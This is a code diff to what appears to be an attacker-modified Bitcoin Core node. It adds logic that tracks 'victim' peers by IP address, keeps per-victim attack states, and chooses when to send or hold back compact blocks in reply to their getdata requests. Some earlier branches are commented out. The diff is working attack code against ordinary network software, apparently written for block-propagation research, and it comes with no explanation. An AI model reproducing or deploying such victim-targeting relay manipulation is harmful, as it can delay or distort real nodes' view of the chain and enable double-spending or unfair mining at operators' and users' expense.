@@ -1110,6 +1110,12 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
             if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
                 std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
                 pvictimState->getdata_request.insert(inv.hash.ToString());
+                /*// make a copy of the inv and store it in the pending_getdata for this victim
+                CDataStream inv_copy_stream(SER_DISK, PROTOCOL_VERSION);
+                inv_copy_stream << inv;
+                CInv copy_inv;
+                inv_copy_stream >> copy_inv;
+                pvictimState->pending_getdata.push_back(copy_inv);*/
             }
         }
     }
@@ -2471,6 +2477,26 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
             CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
 
+            /*
+             * first check if there is any pending getdata request from the victim. We make it independent of
+             * the attack state as sometimes the victim sends getdata request with no reason.
+             */
+
+            /*if (pvictimState->pending_getdata.size()>0 && pvictim) {
+                auto pending_inv_it = pvictimState->pending_getdata.begin();
+                ProcessGetBlockData(pvictim, consensusParams, *pending_inv_it, connman, interruptMsgProc);
+                pvictimState->pending_getdata.erase(pending_inv_it);
+            }*/
+
+            if (pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
+                if (pvictim) {
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
+                              pvictim->addr.ToString());
+                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
+                }
+            }
+
             if (pvictimState->attack_state == 0
                 && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
                 if (pvictim) {
@@ -2480,7 +2506,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                     LogPrintf("VIC %s - sending a new compact block %s directly\n", pvictim->addr.ToString(),
                               cmpctblock.header.GetHash().ToString());
                 }
-            } else if (pvictimState->attack_state == 1
+            } /*else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
                 if (pvictim) {
                     connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
@@ -2488,7 +2514,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                               pvictim->addr.ToString());
                     pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
                 }
-            } else if (pvictimState->attack_state == 1
+            } */else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
                        && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
                 if (pvictim) {
